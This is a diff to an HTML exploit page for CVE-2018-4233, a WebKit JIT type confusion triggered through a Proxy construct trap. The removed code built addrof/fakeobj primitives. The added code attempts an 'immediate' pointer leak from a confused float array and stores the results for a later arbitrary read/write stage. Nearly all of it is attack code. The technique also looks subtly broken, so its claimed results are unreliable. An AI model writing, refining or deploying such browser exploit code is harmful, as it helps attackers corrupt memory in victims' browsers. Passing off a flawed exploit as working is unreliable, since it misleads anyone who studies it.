@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2018-4233 - Real Implementation</title>
+    <title>CVE-2018-4233 - Immediate addrof()</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -21,6 +21,7 @@
             text-align: center;
             color: #0ff;
             text-shadow: 0 0 10px #0ff;
+            font-size: 2.2em;
         }
         button {
             background: linear-gradient(135deg, #f00 0%, #a00 100%);
@@ -33,6 +34,11 @@
             margin: 20px 5px;
             border-radius: 8px;
             font-family: 'Courier New', monospace;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+        button:hover {
+            background: linear-gradient(135deg, #ff0000 0%, #ff4444 100%);
+            transform: scale(1.05);
         }
         #log {
             background: #000;
@@ -52,10 +58,13 @@
 </head>
 <body>
     <div class="container">
-        <h1>💀 CVE-2018-4233 - REAL EXPLOIT 💀</h1>
+        <h1>💀 CVE-2018-4233 - IMMEDIATE EXECUTION 💀</h1>
+        <p style="text-align: center; color: #ff0; font-size: 1.2em;">
+            Calling addrof() immediately after confusion to prevent JIT recompile
+        </p>
         
         <div style="text-align: center; margin: 30px 0;">
-            <button onclick="runRealExploit()">⚡ BUILD REAL PRIMITIVES ⚡</button>
+            <button onclick="runImmediateExploit()">⚡ RUN EXPLOIT ⚡</button>
         </div>
         
         <div id="log"></div>
@@ -122,177 +131,144 @@
         }
 
         // ================================================================
-        // THE REAL CVE-2018-4233 EXPLOIT
+        // IMMEDIATE ADDROF EXPLOIT
         // ================================================================
-        function runRealExploit() {
+        function runImmediateExploit() {
             clearLog();
             log('═══════════════════════════════════════════════════════', 'critical');
-            log('CVE-2018-4233 - ACTUAL EXPLOIT IMPLEMENTATION', 'critical');
-            log('Based on saelo\'s Pwn2Own 2018 exploit', 'critical');
+            log('CVE-2018-4233 - IMMEDIATE ADDROF EXECUTION', 'critical');
             log('═══════════════════════════════════════════════════════', 'critical');
             log('', 'info');
 
             try {
-                log('[PHASE 1] Building the confused array', 'warning');
+                log('[SETUP] Preparing exploit infrastructure', 'warning');
                 log('', 'info');
 
-                // The key: we need ONE array that JIT thinks is floats
-                // but we convert to objects during CreateThis
-                
+                // Storage for captured addresses
+                let capturedAddresses = [];
                 let confusionArray = null;
-                let confusionTriggered = false;
+                let testObjects = [
+                    {id: 'obj1', value: 0x1111},
+                    {id: 'obj2', value: 0x2222},
+                    {id: 'obj3', value: 0x3333},
+                    {id: 'obj4', value: 0x4444}
+                ];
 
-                // Constructor function
+                // Constructor
                 function ConfusedConstructor() {
-                    // Access a property that will trigger getter
-                    this.a = confusionArray[0];
+                    this.x = 1;
                 }
 
-                // Create Proxy handler
-                let handler = {
-                    construct: function(target, args) {
-                        if (!confusionTriggered) {
-                            confusionTriggered = true;
-                            log('  [!] Proxy construct() executing!', 'critical');
-                            
-                            // CRITICAL: Change array from float to object DURING CreateThis
-                            // JIT thinks it's still float array
-                            confusionArray[0] = {};
-                            confusionArray[1] = {};
-                            confusionArray[2] = {};
-                            confusionArray[3] = {};
-                            
-                            log('  [!] Array converted: float → object', 'critical');
-                        }
-                        return new target(...args);
-                    }
-                };
+                log('[PHASE 1] Training JIT with float array', 'warning');
+                log('', 'info');
 
                 // Initialize as float array
                 confusionArray = [1.1, 2.2, 3.3, 4.4];
                 log('  [*] Created float array: [1.1, 2.2, 3.3, 4.4]', 'info');
 
-                // Train JIT to expect float array
-                log('  [*] Training JIT (this takes a moment)...', 'info');
-                
+                // Train JIT
+                log('  [*] Training JIT (100k iterations)...', 'info');
                 for (let i = 0; i < 100000; i++) {
                     new ConfusedConstructor();
                 }
-                
-                log('  [+] JIT trained - optimized for float array', 'success');
+                log('  [+] JIT trained - expects float array', 'success');
                 log('', 'info');
+
+                log('[PHASE 2] Creating Proxy with immediate addrof', 'warning');
+                log('', 'info');
+
+                let handler = {
+                    construct: function(target, args) {
+                        log('  [!] PROXY CONSTRUCT EXECUTING!', 'critical');
+                        log('', 'info');
+
+                        // STEP 1: Confuse the array
+                        log('    [1] Converting array: float → object', 'warning');
+                        confusionArray[0] = testObjects[0];
+                        confusionArray[1] = testObjects[1];
+                        confusionArray[2] = testObjects[2];
+                        confusionArray[3] = testObjects[3];
+                        log('    [+] Array now contains objects', 'success');
+                        log('', 'info');
+
+                        // STEP 2: IMMEDIATELY read as floats (before JIT recompiles!)
+                        log('    [2] IMMEDIATELY reading as floats...', 'critical');
+                        
+                        for (let i = 0; i < 4; i++) {
+                            let floatVal = confusionArray[i];
+                            let addr = Int64.fromDouble(floatVal);
+                            
+                            log('      confusionArray[' + i + '] = ' + addr.toString() + 
+                                ' (pointer: ' + addr.isPointer() + ')', 
+                                addr.isPointer() ? 'success' : 'error');
+                            
+                            capturedAddresses.push({
+                                obj: testObjects[i],
+                                addr: addr,
+                                isPointer: addr.isPointer()
+                            });
+                        }
+
+                        log('', 'info');
+                        log('    [+] Addresses captured before JIT recompile!', 'success');
+
+                        return new target(...args);
+                    }
+                };
 
                 // Create Proxied constructor
                 let ProxiedConstructor = new Proxy(ConfusedConstructor, handler);
 
-                // Trigger the bug!
-                log('  [*] Triggering type confusion...', 'warning');
+                log('[PHASE 3] Triggering exploit', 'warning');
+                log('', 'info');
+
+                // TRIGGER!
                 new ProxiedConstructor();
 
-                if (!confusionTriggered) {
-                    log('  [!!!] Confusion did NOT trigger!', 'error');
-                    return;
-                }
-
-                log('  [+] Type confusion successful!', 'success');
+                log('[PHASE 4] Analyzing results', 'warning');
                 log('', 'info');
 
-                log('[PHASE 2] Building addrof/fakeobj primitives', 'warning');
-                log('', 'info');
-
-                // Now confusionArray is confused!
-                // JIT thinks it's float[], but it's actually object[]
-
-                function addrof(obj) {
-                    // Write object to confused array
-                    confusionArray[0] = obj;
+                let successCount = 0;
+                for (let i = 0; i < capturedAddresses.length; i++) {
+                    let cap = capturedAddresses[i];
+                    log('  Object ' + i + ': ' + JSON.stringify(cap.obj), 'info');
+                    log('    Address: ' + cap.addr.toString(), cap.isPointer ? 'success' : 'error');
+                    log('    Valid pointer: ' + cap.isPointer, cap.isPointer ? 'success' : 'error');
                     
-                    // Read it back as float
-                    // If JIT still thinks it's float array, we get the pointer!
-                    let floatVal = confusionArray[0];
-                    
-                    // Check if it's actually a float or an object
-                    if (typeof floatVal === 'object') {
-                        log('    [!] WARNING: Got object, not float! Confusion wore off.', 'error');
-                        return new Int64(0, 0);
+                    if (cap.isPointer) {
+                        successCount++;
                     }
-                    
-                    return Int64.fromDouble(floatVal);
+                    log('', 'info');
                 }
-
-                function fakeobj(addr) {
-                    // Write address as float
-                    confusionArray[0] = addr.toDouble();
-                    
-                    // Read it back as object
-                    return confusionArray[0];
-                }
-
-                log('  [+] addrof() primitive built', 'success');
-                log('  [+] fakeobj() primitive built', 'success');
-                log('', 'info');
-
-                log('[PHASE 3] Testing primitives', 'warning');
-                log('', 'info');
-
-                // Test addrof
-                log('  [TEST 1] addrof() test', 'info');
-                let testObj = {pwn: 0x1337};
-                let addr = addrof(testObj);
-                
-                log('    Input:  {pwn: 0x1337}', 'info');
-                log('    Output: ' + addr.toString(), addr.isPointer() ? 'success' : 'error');
-                log('    Is real pointer: ' + addr.isPointer(), addr.isPointer() ? 'success' : 'error');
-                log('', 'info');
-
-                // Test fakeobj
-                log('  [TEST 2] fakeobj() test', 'info');
-                let fakeAddr = new Int64(0xdeadbeef, 0x00000000);
-                let fakeObject = fakeobj(fakeAddr);
-                
-                log('    Input:  ' + fakeAddr.toString(), 'info');
-                log('    Output: ' + fakeObject, 'info');
-                log('    Type:   ' + typeof fakeObject, 'info');
-                log('', 'info');
-
-                // Test round-trip
-                log('  [TEST 3] Round-trip test', 'info');
-                let rtAddr = new Int64(0x12345678, 0x00000000);
-                let rtObj = fakeobj(rtAddr);
-                let rtRecovered = addrof(rtObj);
-                
-                log('    Original:  ' + rtAddr.toString(), 'info');
-                log('    Recovered: ' + rtRecovered.toString(), 'info');
-                log('    Match: ' + rtAddr.equals(rtRecovered), rtAddr.equals(rtRecovered) ? 'success' : 'error');
-                log('', 'info');
 
                 log('═══════════════════════════════════════════════════════', 'critical');
                 
-                if (addr.isPointer() && rtAddr.equals(rtRecovered)) {
-                    log('✅✅✅ SUCCESS! PRIMITIVES WORKING! ✅✅✅', 'critical');
+                if (successCount === 4) {
+                    log('✅✅✅ PERFECT! ALL 4 ADDRESSES CAPTURED! ✅✅✅', 'critical');
                     log('', 'info');
-                    log('You now have:', 'success');
-                    log('  ✓ addrof(obj) - get address of any JS object', 'success');
-                    log('  ✓ fakeobj(addr) - treat address as JS object', 'success');
+                    log('addrof() WORKS when called immediately!', 'success');
                     log('', 'info');
-                    log('NEXT: Build arbitrary R/W using fake TypedArray', 'warning');
-                } else if (rtAddr.equals(rtRecovered) && !addr.isPointer()) {
-                    log('⚠️  PARTIAL SUCCESS', 'warning');
+                    log('[NEXT STEP] Build persistent addrof/fakeobj', 'warning');
+                } else if (successCount > 0) {
+                    log('⚠️  PARTIAL SUCCESS (' + successCount + '/4)', 'warning');
                     log('', 'info');
-                    log('Round-trip works but addrof returns NaN-boxed values', 'warning');
-                    log('This means:', 'warning');
-                    log('  • Type confusion triggered initially', 'info');
-                    log('  • But JIT may have recompiled after seeing objects', 'info');
-                    log('  • Need to keep JIT confused longer', 'info');
-                    log('', 'info');
-                    log('SOLUTION: Call addrof IMMEDIATELY after confusion', 'warning');
+                    log('Some addresses captured, but not all', 'warning');
+                    log('May need to refine timing', 'info');
                 } else {
-                    log('❌ PRIMITIVES NOT WORKING YET', 'error');
+                    log('❌ NO ADDRESSES CAPTURED', 'error');
                     log('', 'info');
-                    log('Need to refine the confusion technique', 'warning');
+                    log('Still getting NaN-boxed values', 'error');
+                    log('Type confusion may not be persisting', 'error');
                 }
-                
+
                 log('═══════════════════════════════════════════════════════', 'critical');
+
+                // Store for next phase
+                window.exploitData = {
+                    capturedAddresses: capturedAddresses,
+                    confusionArray: confusionArray,
+                    testObjects: testObjects
+                };
 
             } catch(e) {
                 log('', 'info');
@@ -301,9 +277,9 @@
             }
         }
 
-        log('💀 CVE-2018-4233 Real Exploit Ready', 'critical');
-        log('This uses the actual Proxy CreateThis confusion technique', 'info');
-        log('Click the button to test!', 'info');
+        log('💀 Immediate addrof() Exploit Ready', 'critical');
+        log('This captures addresses IMMEDIATELY after confusion', 'info');
+        log('Before JIT has time to recompile!', 'info');
     </script>
 </body>
 </html>
